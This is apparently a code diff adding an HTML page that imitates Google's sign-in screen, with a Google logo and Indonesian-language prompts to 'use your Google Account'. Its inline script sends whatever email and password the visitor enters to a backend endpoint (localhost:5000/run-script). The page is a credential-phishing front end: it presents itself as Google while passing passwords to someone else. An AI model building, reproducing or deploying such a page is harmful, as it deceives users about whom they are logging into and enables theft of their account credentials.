@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <img src="Google.png" class="my-image"></img>
+        <h2>Login</h2>
+        <p>Gunakan Akun Google Anda</p>
+        <input type="text" id="email" placeholder="Email atau nomor telepon" required>
+        <input type="password" id="password" placeholder="Masukkan sandi">
+        <button id="submit">Login</button>
+        <p><a href="#">Lupa email?</a></p>
+        <footer>
+            <p>Bukan komputer Anda? Gunakan jendela penjelajahan rahasia untuk login.<a href="#">Learn more</a></p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('submit').addEventListener('click', async function () {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            
+            if (email && password) {
+                try {
+                    const response = await fetch("http://localhost:5000/run-script", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ email, password })
+                    });
+
+                    const data = await response.json();
+                    alert(data.message); 
+
+                } catch (error) {
+                    alert("Gagal mengirim data.");
+                    console.error(error);
+                }
+            }
+        });
+    </script>
+
+</body>
+</html>
